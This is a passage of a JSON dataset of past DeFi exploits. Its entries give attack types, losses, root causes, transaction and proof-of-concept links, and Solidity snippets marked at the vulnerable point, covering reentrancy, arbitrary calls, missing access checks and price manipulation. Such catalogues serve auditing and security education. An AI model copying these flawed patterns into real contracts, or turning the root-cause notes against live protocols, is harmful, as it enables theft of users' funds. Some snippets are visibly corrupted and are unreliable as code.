        "vulnerable_code_snippet": "function 0xd2beb00a(uint256 varg0, uint256 varg1, uint256 varg2, uint256 varg3) public nonPayable {\n    require(msg.data.length - 4 >= 128);\n    require(msg.data.length - 4 + ~31 >= 96);\n    require(!((MEM[64] + 96 > uint64.max) | (MEM[64] + 96 < MEM[64])), Panic(65)); // failed memory allocation (too much memory)\n    MEM[64] = MEM[64] + 96;\n    require(varg0 < _poolInfo.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice\n    _poolInfo[varg0].field0 = varg1;\n    _poolInfo[varg0].field1 = varg2;\n    _poolInfo[varg0].field2 = varg3;\n}"
    },
    {
        "type": "Flashloans, Precision",
        "date": "20231018",
        "title": "Hopelend",
        "root_cause": "In the first step, the attacker exploited the liquidity imbalance in the pool of the target asset, manipulating the liquidity index of the related hToken to control its value. By leveraging minimal hToken collateral, the attacker borrowed all other underlying assets. The attacker then repeatedly deposited and withdrew to drain the underlying assets due to a precision loss vulnerability. This process ultimately drained all assets from Hopelend.",
        "attack_tx": "https://etherscan.io/tx/0x1a7ee0a7efc70ed7429edef069a1dd001fbff378748d91f17ab1876dc6d10392",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/Hopelend_exp.sol",
        "analysis": "https://lunaray.medium.com/deep-dive-into-hopelend-hack-5962e8b55d3f",
        "vulnerable_code_snippet": "function rayDiv(uint256 a, uint256 b) internal pure returns (uint256 c) {\n  // to avoid overflow, a <= (type(uint256).max - halfB) / RAY\n  assembly {\n    if or(iszero(b), iszero(iszero(gt(a, div(sub(not(0), div(b, 2)), RAY))))) {\n      revert(0, 0)\n    }\n\n    c := div(add(mul(a, RAY), div(b, 2)), b)\n  }\n}"
    },
    {
        "type": "Sandwich",
        "date": "20230512",
        "lost": "$50k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/LW_exp.sol",
        "title": "LW",
        "root_cause": "KALOS: LW was hacked on May 11, 2023. This vulnerability is under the category of Rugpull cases, which, unlike other instances, were exploited by owners. A total of 6 accounts had funds forcefully drained.",
        "attack_tx": [
            "https://bscscan.com/tx/0xb846f3aeb9b3027fe138b23bbf41901c155bd6d4b24f08d6b83bd37a975e4e4a",
            "https://bscscan.com/tx/0x96b34dc3a98cd4055a984132d7f3f4cc5a16b2525113b8ef83c55ac0ba2b3713"
        ],
        "analysis": [
            "https://twitter.com/PeckShieldAlert/status/1656850634312925184",
            "https://twitter.com/hexagate_/status/1657051084131639296",
            "https://twitter.com/kalos_security/status/1668092799512907777"
        ],
        "vulnerable_code_snippet": "receive() external payable {\n        if(thanPrice==0) return;\n        if(IERC20(_token).balanceOf(_marketAddr) >= 3000e18) {\n            IERC20(_token).transferFrom(_marketAddr, address(this), 3000e18);\n            swapTokensForDead(3000e18); //vulnerable point\n            thanPrice -= 1;\n        }\n    }"
    },
    {
        "type": "Flashloans, Reentrancy, Stablecoin",
        "date": "20210817",
        "Lost": "$5 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20210817-xsurge---flashloan-attack--reentrancy",
        "Title": "XSURGE",
        "root_cause": "Reentrancy. Don't follow check-effect-interaction pattern.",
        "vulnerable_code_snippet": "    /** Sells SURGE Tokens And Deposits the BNB into Seller's Address */\n    function sell(uint256 tokenAmount) public nonReentrant returns (bool) {\n        address seller = msg.sender;\n        \n        // make sure seller has this balance\n        require(_balances[seller] >= tokenAmount, 'cannot sell above token amount');\n        \n        // calculate the sell fee from this transaction\n        uint256 tokensToSwap = tokenAmount.mul(sellFee).div(10**2);\n        \n        // how much BNB are these tokens worth?\n        uint256 amountBNB = tokensToSwap.mul(calculatePrice());\n        \n        // send BNB to Seller\n        (bool successful,) = payable(seller).call{value: amountBNB, gas: 40000}(\"\");  //vulnerable point\n        if (successful) {\n            // subtract full amount from sender\n            _balances[seller] = _balances[seller].sub(tokenAmount, 'sender does not have this amount to sell');\n            // if successful, remove tokens from supply\n            _totalSupply = _totalSupply.sub(tokenAmount);  //vulnerable point\n        } else {\n            revert();\n        }\n        emit Transfer(seller, address(this), tokenAmount);\n        return true;\n    }\n    \n    /** Returns the Current Price of the Token */\n    function calculatePrice() public view returns (uint256) {\n        return ((address(this).balance).div(_totalSupply));\n    }\n    \n    /** Mints Tokens to the Receivers Address */\n    function mint(address receiver, uint amount) internal {\n        _balances[receiver] = _balances[receiver].add(amount);\n        _totalSupply = _totalSupply.add(amount);\n    }\n    \n    /** Amount of BNB in Contract */\n    function getBNBQuantityInContract() public view returns(uint256){\n        return address(this).balance;\n    }\n    /** Returns the value of your holdings before the 6% sell fee */\n    function getValueOfHoldings(address holder) public view returns(uint256) {\n        return _balances[holder].mul(calculatePrice());\n    }\n    \n    receive() external payable {\n        uint256 val = msg.value;\n        address buyer = msg.sender;\n        purchase(buyer, val);\n    }"
    },
    {
        "type": "Access Control, Lack of permission control",
        "date": "20240610",
        "title": "Bazaar",
        "root_cause": "The root cause is no permission check in the `exitPool` function, allowing anyone to impersonate liquidity providers and drain the pool",
        "attack_tx": "https://blastscan.io/tx/0x7fdd140f7631f62d62f7256ee4a38af51a4723ad5d66adc9b9685bf78f750f2d",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/Bazaar_exp.sol",
        "vulnerable_code": "https://blastscan.io/address/0xefb4e3Cc438eF2854727A7Df0d0baf844484EdaB",
        "analysis": "https://x.com/shoucccc/status/1800353122159833195",
        "update": "refunded 90%",
        "vulnerable_code_snippet": "function exitPool(bytes32 poolId, address sender, address payable recipient, ExitPoolRequest memory request)\n        external\n        override\n        nonReentrant\n        registeredPool(poolId)\n    {\n        (address[] memory tokens, uint256[] memory balances,) = getPoolTokens(poolId);\n        require(tokens.length == TOKENS_LENGTH && tokens.length == request.tokens.length, \"mismatch tokens length\");\n\n        IBazaarLBP lbp = IBazaarLBP(_getPoolAddress(poolId));\n        (uint256[] memory amountsOut,) = lbp.onExitPool(poolId, sender, recipient, balances, 0, 0, request.userData); <-- vulnerable point\n\n        for (uint256 i = 0; i < tokens.length; i++) {\n            uint256 amountOut = amountsOut[i];\n            require(amountOut >= request.minAmountsOut[i], \"limit not reached\");\n            require(tokens[i] == _translateToErc20(request.tokens[i]), \"token mismatch\");\n\n            address token = tokens[i];\n            poolBalances[poolId][token] = poolBalances[poolId][token].sub(amountOut);\n\n            // use original address such that ETH is supported\n            _sendFunds(request.tokens[i], recipient, amountOut);\n        }\n    }"
    },
    {
        "type": "Insufficient validation",
        "date": "20240717",
        "lost": "73K",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/Spectra_finance_exp.sol",
        "title": "Spectra finance",
        "root_cause": "The root cause is an arbitrary call in their router contract, which allows the attacker to drain all tokens approved to that contract.",
        "attack_tx": "https://app.blocksec.com/explorer/tx/eth/0x491cf8b2a5753fdbf3096b42e0a16bc109b957dc112d6537b1ed306e483d0744",
        "analysis": "https://x.com/shoucccc/status/1815981585637990899",
        "vulnerable_code_snippet": "} else if (command == Commands.KYBER_SWAP) {\n    address kyberRouter,\n    address tokenIn,\n    uint256 amountIn,\n    address tokenOut,\n    bytes memory targetData = abi.decode(_inputs, (address, address, uint256, address, uint256, bytes));\n    \n    if (tokenOut == Constants.ETH) {\n        revert AddressError();\n    }\n\n    if (tokenIn == Constants.ETH) {\n        if (msg.value != amountIn) {\n            revert AmountError();\n        }\n    } else {\n        amountIn = _resolveTokenValue(tokenIn, amountIn);\n        IERC20(tokenIn).forceApprove(kyberRouter, amountIn);\n        (bool success,) = kyberRouter.call{value: msg.value}(targetData); // Arbitrary Call to Any Address\n        if (!success) {\n            revert CallFailed();\n        }\n    }\n}"
    },
    {
        "type": "Arbitrary call",
        "date": "20220326",
        "title": "Auctus",
        "root_cause": "Arbitrary call via write(). exchangeData is controllable and without any input validation",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220326-auctus",
        "attack_tx": null,
        "analysis": "Vulnerable code snippet: \n[https://etherscan.io/address/0xE7597F774fD0a15A617894dc39d45A28B97AFa4f#code#F1#L101](https://etherscan.io/address/0xE7597F774fD0a15A617894dc39d45A28B97AFa4f#code#F1#L101)\nexchangeData is controllable and without any input validation. \n\nVulnerable point: [https://etherscan.io/address/0xE7597F774fD0a15A617894dc39d45A28B97AFa4f#code#F1#L135](https://etherscan.io/address/0xE7597F774fD0a15A617894dc39d45A28B97AFa4f#code#F1#L135)\n\n```solidity\nfunction write(\n        address acoToken, \n        uint256 collateralAmount, \n        address exchangeAddress, \n        bytes memory exchangeData \n    ) \n        nonReentrant \n        setExchange(exchangeAddress) \n        public \n        payable \n    {\n        require(msg.value > 0,  \"ACOWriter::write: Invalid msg value\");\n        require(collateralAmount > 0,  \"ACOWriter::write: Invalid collateral amount\");\n        \n        address _collateral = IACOToken(acoToken).collateral();\nif (_isEther(_collateral)) {\n            IACOToken(acoToken).mintToPayable{value: collateralAmount}(msg.sender);\n        } else {\n            _transferFromERC20(_collateral, msg.sender, address(this), collateralAmount);\n            _approveERC20(_collateral, acoToken, collateralAmount);\n            IACOToken(acoToken).mintTo(msg.sender, collateralAmount);\n        }\n        \n        _sellACOTokens(acoToken, exchangeData);\n    }\n/**\n     * @dev Internal function to sell the ACO tokens and transfer the premium to the transaction sender.\n     * @param acoToken Address of the ACO token.\n     * @param exchangeData Data to be sent to the exchange.\n     */\n    function _sellACOTokens(address acoToken, bytes memory exchangeData) internal {\n        uint256 acoBalance = _balanceOfERC20(acoToken, address(this));\n        _approveERC20(acoToken, erc20proxy, acoBalance);\n        (bool success,) = _exchange.call{value: address(this).balance}(exchangeData); //vulnerable point\n        require(success, \"ACOWriter::_sellACOTokens: Error on call the exchange\");\n    }",
        "vulnerable_code_snippet": "function write(\n        address acoToken, \n        uint256 collateralAmount, \n        address exchangeAddress, \n        bytes memory exchangeData \n    ) \n        nonReentrant \n        setExchange(exchangeAddress) \n        public \n        payable \n    {\n        require(msg.value > 0,  \"ACOWriter::write: Invalid msg value\");\n        require(collateralAmount > 0,  \"ACOWriter::write: Invalid collateral amount\");\n        \n        address _collateral = IACOToken(acoToken).collateral();\n        if (_isEther(_collateral)) {\n            IACOToken(acoToken).mintToPayable{value: collateralAmount}(msg.sender);\n        } else {\n            _transferFromERC20(_collateral, msg.sender, address(this), collateralAmount);\n            _approveERC20(_collateral, acoToken, collateralAmount);\n            IACOToken(acoToken).mintTo(msg.sender, collateralAmount);\n        }\n        \n        _sellACOTokens(acoToken, exchangeData);\n    }\n    /**\n     * @dev Internal function to sell the ACO tokens and transfer the premium to the transaction sender.\n     * @param acoToken Address of the ACO token.\n     * @param exchangeData Data to be sent to the exchange.\n     */\n    function _sellACOTokens(address acoToken, bytes memory exchangeData) internal {\n        uint256 acoBalance = _balanceOfERC20(acoToken, address(this));\n        _approveERC20(acoToken, erc20proxy, acoBalance);\n        (bool success,) = _exchange.call{value: address(this).balance}(exchangeData); //vulnerable point\n        require(success, \"ACOWriter::_sellACOTokens: Error on call the exchange\");"
    },
    {
        "type": "Flashloans, Insufficient validation, skim",
        "date": "20221230",
        "title": "DFS",
        "lost": "$1450",
        "root_cause": "Price Manipulation. When the receiving address of the dFS token transfer is the pair, a certain percentage of the tokens at this address will be additionally destroyed, and the attacker manipulates the price by invoking the transfer() and skim() function to burn the dfs tokens in the pair.",
        "attack_tx": "https://bscscan.com/tx/0xcddcb447d64c2ce4b3ac5ebaa6d42e26d3ed0ff3831c08923c53ea998f598a7c",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/DFS_exp.sol",
        "analysis": "https://twitter.com/CertiKAlert/status/1608788290785665024",
        "vulnerable_code_snippet": "function _transfer(\n        address       address to,\n        uint256 amount\n    ) internal {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n        if (from == address(this) || to == address(this)) {\n            return;\n        }\n        uint256 rate = 5;\n        uint256 fee = 0;\n        if (to == address(pair) || from == address(pair)) { \n            if (takeFee && !exclusiveFromFee[from]) {\n                fee = amount.mul(rate).div(1000);\n                _balance[from] = _balance[from].sub(amount).sub(fee);\n                _balance[destroyAddress] = _balance[destroyAddress].add(fee);\n                emit Transfer(from, destroyAddress, fee);\n            }\n        } else {\n            _balance[from] = _balance[from].sub(amount);\n        }\n        if (_balance[from] == 0 && holders.length != 0) {\n            holders[holdersIndex[from]] = holders[holders.length-1];\n            holdersIndex[holders[holders.length-1]] = holdersIndex[from];\n            holders.pop();\n            includeHolders[from] = false;\n        }\n        _balance[to] = _balance[to].add(amount);\n        if (!includeHolders[to]) {\n            holdersIndex[to] = holders.length;\n            holders.push(to);\n            includeHolders[to] = true;\n        }\n        emit Transfer(from, to, amount);\n    }"
    },
    {
        "type": "Miscalculation",
        "date": "20230524",
        "lost": "714K USD",
        "title": "CS Token",
        "root_cause": "Blocksec, The root cause is that in _transfer(), the burnAmount is calculated from SellAmount, but the issue is that SellAmount is not updated! Numen, By exploiting the mechanism of burning funds during the transaction, the attacker gradually reduced the quantity of CS tokens in the [BUSD, CS] trading pair.",
        "vulnerable_code": "https://bscscan.com/address/0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e#code#L711",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/CS_exp.sol",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0x906394b2ee093720955a7d55bff1666f6cf6239e46bea8af99d6352b9687baa4",
        "analysis": [
            "https://twitter.com/BlockSecTeam/status/1661098394130198528",
            "https://twitter.com/numencyber/status/1661207123102167041"
        ],
        "vulnerable_code_snippet": "function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) private {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n        require(!blackList[from], \"black account\");\n        require(!blackList[to], \"black account\");\n        if (!canContract && _isContract(msg.sender) && !exPairs[from]) {\n            require(whiteContractList[msg.sender], \"not allowed contract trade\");\n        }\n\n        if (!canBuy &&  exPairs[from]){\n            require(whiteList[to], \"not allow trade\");\n        }\n        if (!canSell &&  exPairs[to]){\n            require(whiteList[from], \"not allow trade\");\n        }        \n\n        bool takeTransFee = isTransFee && !feeWhiteList[from] && !feeWhiteList[to] && !exPairs[from] && !exPairs[to] && !_isLiquidity(from,to);\n        bool takeSellFee = isSellFee && !feeWhiteList[from] &&  exPairs[to] && !_isLiquidity(from,to);\n        bool takeBuyFee = isBuyFee && !feeWhiteList[to] &&  exPairs[from] && !_isLiquidity(from,to);\n\n        if (_isLiquidity(from,to) && exPairs[to]){\n            updateLiquidityInfo(amount);\n        }\n\n        bool canSell =  sellAmount >= 1;\n        if(canSell &&from != address(this) &&from != uniswapV2Pair &&from != owner() && to != owner() && !_isLiquidity(from,to)){\n            sync();\n        }\n\n        FeeParam memory param;\n        if (takeBuyFee){\n            require(amount <= limitBuy,\"exceeds buying limit!\");\n            uint256 price = getBuyPrice(from);\n            updatePrice(price);              \n            _getBuyParam(amount,param);\n        }\n        if(takeSellFee){\n            require(amount <= limitSell,\"exceeds selling limit!\");\n            uint256 price = getSellPrice(to);\n            updatePrice(price);\n            _getSellParam(amount,param);\n            sellAmount = amount;  //vulnerable point\n            uint256 contractTokenBalance = balanceOf(address(this));\n            bool canSwap = contractTokenBalance >= minTokenNumberToSell;\n\n            if (\n                canSwap &&\n                !inSwapAndLiquify &&\n                from != uniswapV2Pair\n            ) {\n                inSwapAndLiquify = true;\n\n                swapAndLiquify(contractTokenBalance);\n\n                inSwapAndLiquify = false;\n            }\n        }\n        if (takeTransFee){\n            _getTransferParam(amount,param);\n        }\n        if (param.tTransferAmount == 0) {\n            param.tTransferAmount = amount;\n        }        \n        _tokenTransfer(from,to,amount,param);\n    }\n\nfunction sync() private lockTheSync{\n        if (totalBurnAmount>=maxBurnAmount){\n            return;\n        }\n        uint256 burnAmount = sellAmount.mul(800).div(1000); //vulnerable point\n        sellAmount = 0;\n    }"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20230718",
        "title": "APEDAO",
        "root_cause": "$APEDAO contract mistook the attacker's behavior transfer as a sell operation and gradually added up a value called \"amountToDead\".Then the attacker repeatedly transfer in $APEDAO .Eventually, the attacker calls godead function to burn the $APEDAO held in the pair contract, causing the token price to rise.",
        "attack_tx": "https://bscscan.com/tx/0x8d35dfd9968ce61fb969ffe8dcc29eeeae864e466d2cb0b7d26ce63644691994",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/ApeDAO_exp.sol",
        "analysis": "https://twitter.com/BeosinAlert/status/1681316257034035201",
        "lost": "$7K",
        "vulnerable_code_snippet": "if (_transferType == 1){ // 1: buy\n            if ( openTime < block.timestamp && block.timestamp < limitTime  ){\n                require(_balances[_to] <= limitUserHave , \"current limit\");\n            }\n        }\n\n        setShareAndProcess(_from,_to,isSwap);\n\n        if (_transferType == 2){ \n            if (isOpenToDead){\n                amountToDead += amountx * 20 /100;\n            }\n            \n        }\n        \nfunction goDead() public{\n        if (amountToDead > 0){\n            _rawTransfer(address(pair), address(0xdEaD), amountToDead);\n            pair.sync();\n            amountToDead = 0;\n        }\n    }"
    },
    {
        "type": "Deflationary token, Flashloans, Miscalculation",
        "date": "20230207",
        "title": "FDP Token",
        "root_cause": "Price Manipulation of deflationary tokens via flashloan. The attacker uses the tAmount to call deliver function, which is to reduce the user-specified tAmount and add it to the fee. After calling deliver, _getRate becomes smaller when _rTotal is 28% less and _tTotal remains the same. Since transaction pair is not a deflation excluded address, the balance obtained becomes larger. The attacker can directly withdraw the increased FDP and swap into WBNB",
        "attack_tx": "https://bscscan.com/tx/0x09925028ce5d6a54801d04ff8f39e79af6c24289e84b301ddcdb6adfa51e901b",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/FDP_exp.t.sol",
        "analysis": "https://twitter.com/BeosinAlert/status/1622806011269771266",
        "vulnerable_code": "https://bscscan.com/address/0x1954b6bd198c29c3ecf2d6f6bc70a4d41ea1cc07#code#L575",
        "lost": "16 WBNB",
        "vulnerable_code_snippet": "function deliver(uint256 tAmount) public {\n        address sender = _msgSender();\n        require(!_isExcluded[sender], \"Excluded addresses cannot call this function\");\n        (uint256 rAmount,,,,,) = _getValues(tAmount);\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n        _rTotal = _rTotal.sub(rAmount);\n        _tFeeTotal = _tFeeTotal.add(tAmount);\n    }"
    },
    {
        "type": "Bridge, CrossChain, Insufficient validation",
        "date": "20210811",
        "lost": "$611 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20210811-poly-network---bridge-getting-around-modifier-through-cross-chain-message",
        "title": "Poly Network",
        "fixed": "fixed",
        "root_cause": "Insufficient validation. Brute-force a `_method` field that hashes to a 32-bit value that is exactly the ID for putCurEpochConPubKeyBytes! In other words, the ID of the function called is computed as the 32-bit truncation of a 256-bit Keccak hash of the string _method and a suffix.",
        "analysis": "brute-force a **_method** field that hashes to a 32-bit value that is exactly the ID for putCurEpochConPubKeyBytes!",
        "references": [
            "https://research.kudelskisecurity.com/2021/08/12/the-poly-network-hack-explained/"
        ],
        "vulnerable_code_snippet":"bytes4(keccak256(abi. encodePacked (_method, \"(bytes, bytes, uint64)\") )),"
    },
    {
        "type": "Dex/AMM, ERC20, Miscalculation",
        "date": "20210428",
        "title": "Uranium",
        "root_cause": "Incorrect calculation. Inconsistent value in the code, 10000 vs 1000",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20210428-uranium---miscalculation",
        "analysis": "Vulnerable code snippet: same Nimbus's issue\n[https://bscscan.com/address/0xA943eA143cd7E79806d670f4a7cf08F8922a454F#code#F3#L180](https://bscscan.com/address/0xA943eA143cd7E79806d670f4a7cf08F8922a454F#code#F3#L180)\ninconsistent value in the code, 10000 vs 1000\n```solidity\nfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n        require(amount0Out > 0 || amount1Out > 0, 'UraniumSwap: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'UraniumSwap: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        {\n            // scope for _token{0,1}, avoids stack too deep errors\n            address _token0 = token0;\n            address _token1 = token1;\n            require(to != _token0 && to != _token1, 'UraniumSwap: INVALID_TO');\n            if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n            if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n            if (data.length > 0) IUraniumCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);\n            balance0 = IERC20(_token0).balanceOf(address(this));\n            balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'UraniumSwap: INSUFFICIENT_INPUT_AMOUNT');\n        {\n            // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n            uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(16)); //vulnerable point\n            uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(16)); //vulnerable point\n            require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UraniumSwap: K'); //vulnerable\n        }\n    ```",
        "lost": "$50 M",
        "vulnerable_code_snippet": "function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n        require(amount0Out > 0 || amount1Out > 0, 'UraniumSwap: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'UraniumSwap: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 && to != _token1, 'UraniumSwap: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IUraniumCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'UraniumSwap: INSUFFICIENT_INPUT_AMOUNT');\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(16)); //vulnerable point\n        uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(16)); //vulnerable point\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UraniumSwap: K'); //vulnerable\n        }"
    },
    {
        "type": "Reentrancy",
        "date": "20240211",
        "lost": "20 ETH",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/Game_exp.sol",
        "title": "Game",
        "root_cause": "The exploit stemmed from a logic error in newBidEtherMin(), enabling a single attacker to place bids exceeding 5% of the last bid amount without validation. This flaw resulted in unintended addresses receiving the full last bid amount. Additionally, using \"call\" in _sendEther facilitated re-entrancy attacks, allowing the attacker to make unauthorized transfers",
        "attack_tx": "https://phalcon.blocksec.com/explorer/tx/eth/0x0eb8f8d148508e752d9643ccf49ac4cb0c21cbad346b5bbcf2d06974d31bd5c4",
        "analysis": "https://twitter.com/AnciliaInc/status/1757533144033739116",
        "vulnerable_code_snippet": "function makeBid() external payable {\n        require(msg.value > newBidEtherMin(), \"bid is too low\");\n        if (bidAddress != address(0)) {\n            _sendEther(bidAddress, bidEther);\n        }\n        bidAddress = msg.sender;\n        bidEther = msg.value;\n        if (auctionEndTime == 0)\n            auctionEndTime = block.timestamp + auctionStartTimer;\n        else auctionEndTime += auctionBidAddsTimer;\n    }\n...\nfunction newBidEtherMin() public view returns (uint256) {\n        return (bidEther * auctionBidStepShare) / auctionBidStepPrecesion;\n    }\n...\nfunction _sendEther(address to, uint256 count) internal {\n        (bool sentFee, ) = payable(to).call{value: count}(\"\");\n        require(sentFee, \"sent fee error: ether is not sent\");\n    }"
    },
    {
        "type": "Business Logic Flaw, Incorrect logic",
        "date": "20231125",
        "title": "TheNFTV2",
        "root_cause": "The attackers keep approving NFT token ID 1071 to themselves and burn the token. After the burn operation, they can retrieve the token through transferFrom and re-burn it repeatedly. During each operation, the attacker receives some $THEDAO tokens as a reward.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/TheNFTV2_exp.sol",
        "attack_tx": "https://etherscan.io/tx/0xd5b4d68432cbbd912130bbb5b93399031ddbb400d8f723c78050574de7533106",
        "analysis": "https://x.com/MetaTrustAlert/status/1728616715825848377?s=20",
        "lost": "$19K",
        "vulnerable_code_snippet": "function transferFrom(address _from, address _to, uint256 _tokenId) external regulated(_to) {\n    require (_tokenId < max, \"index out of range\");\n    address o = ownership[_tokenId];\n    require (o == _from, \"_from must be owner\");\n    address a = approval[_tokenId];\n    require (o == msg.sender|| (a == msg.sender) || (approvalAll[o][msg.sender]), \"not permitted\");\n    _transfer(_from, _to, _tokenId);\n    if (a != address(0)) {\n        approval[_tokenId] = address(0); // clear previous approval\n        emit Approval(msg.sender, address(0), _tokenId);\n    }\n}\n...\nfunction burn(uint256 id) external {\n    require (msg.sender == ownership[id], \"only owner can burn\");\n    if (theDAO.transfer(msg.sender, oneDao)) {   // send theDAO token back to sender\n        _transfer(msg.sender, DEAD_ADDRESS, id); // burn the NFT token\n        emit Burn(msg.sender, id);\n    }\n}"
    },
    {
        "type": "Access Control, ERC20",
        "date": "20220608",
        "lost": "$2M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220608-gymnetwork---access-control",
        "title": "GYMNetwork",
        "fixed": true,
        "root_cause": "Incorrect access control.",
        "vulnerable_code": "https://bscscan.com/address/0x0288fba0bf19072d30490a0f3c81cd9b0634258a#code#F1#L291",
        "fixed_code": "https://bscscan.com/address/0xb131c1cc89d209fb5c7250f68d31eff0fb5640d3#code#F1#L299",
        "vulnerable_code_snippet": "/**\n     * @notice Deposit in given pool\n     * @param _depositAmount: Amount of want token that user wants to deposit\n     */\n    function depositFromOtherContract(\n        uint256 _depositAmount,\n        uint8 _periodId,\n        bool isUnlocked,\n        address _from\n    ) external external {  //vulnerable point\n        require(isPoolActive,'Contract is not running yet');\n        _autoDeposit(_depositAmount,_periodId,isUnlocked,_from);\n    }"
    },
    {
        "type": "Flashloans, Miscalculation, Yield",
        "date": "20210519",
        "title": "PancakeBunny",
        "fixed": "fixed",
        "root_cause": "Incorrect profit calculation via balanceOf",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20210519-pancakebunny---price-oracle-manipulation",
        "analysis": "Very similar PancakeHunny.\n\nVulnerable code snippet:\n\n[https://www.bscscan.com/address/0xed1443def66e4e8901377467d449499eaba1559a#code#F1#L235](https://www.bscscan.com/address/0xed1443def66e4e8901377467d449499eaba1559a#code#F1#L235)\n\n[https://bscscan.com/address/0x819eea71d3f93bb604816f1797d4828c90219b5d#code#F1#L204](https://bscscan.com/address/0x819eea71d3f93bb604816f1797d4828c90219b5d#code#F1#L204)",
        "vulnerable_code_snippet": "// @dev profits only (underlying + bunny) + no withdraw fee + perf fee\n    function getReward() external override {\n        uint amount = earned(msg.sender);\n        uint shares = Math.min(amount.mul(totalShares).div(balance()), _shares[msg.sender]);\n        totalShares = totalShares.sub(shares);\n        _shares[msg.sender] = _shares[msg.sender].sub(shares);\n        _cleanupIfDustShares();\n\n        amount = _withdrawTokenWithCorrection(amount);\n        uint depositTimestamp = _depositedAt[msg.sender];\n        uint performanceFee = canMint() ? _minter.performanceFee(amount) : 0;\n        if (performanceFee > DUST) {\n            _minter.mintForV2(address(_stakingToken), 0, performanceFee, msg.sender, depositTimestamp); //check mintForV2\n            amount = amount.sub(performanceFee);\n        }\n\n        _stakingToken.safeTransfer(msg.sender, amount);\n        emit ProfitPaid(msg.sender, amount, performanceFee);\n    }\n...\nfunction mintForV2(address asset, uint _withdrawalFee, uint _performanceFee, address to, uint) external payable override onlyMinter {\n        uint feeSum = _performanceFee.add(_withdrawalFee);\n        _transferAsset(asset, feeSum);\n\n        if (asset == BUNNY) {\n            IBEP20(BUNNY).safeTransfer(DEAD, feeSum);\n            return;\n        }\n\n        uint bunnyBNBAmount = _zapAssetsToBunnyBNB(asset, feeSum, true);\n        if (bunnyBNBAmount == 0) return;\n\n        IBEP20(BUNNY_BNB).safeTransfer(BUNNY_POOL, bunnyBNBAmount);\n        IStakingRewards(BUNNY_POOL).notifyRewardAmount(bunnyBNBAmount);\n\n        (uint valueInBNB,) = priceCalculator.valueOfAsset(BUNNY_BNB, bunnyBNBAmount); // check valueOfAsset\n        uint contribution = valueInBNB.mul(_performanceFee).div(feeSum);\n...\nfunction valueOfAsset(address asset, uint amount) public view override returns (uint valueInBNB, uint valueInUSD) {\n        if (asset == address(0) || asset == WBNB) {\n            valueInBNB = 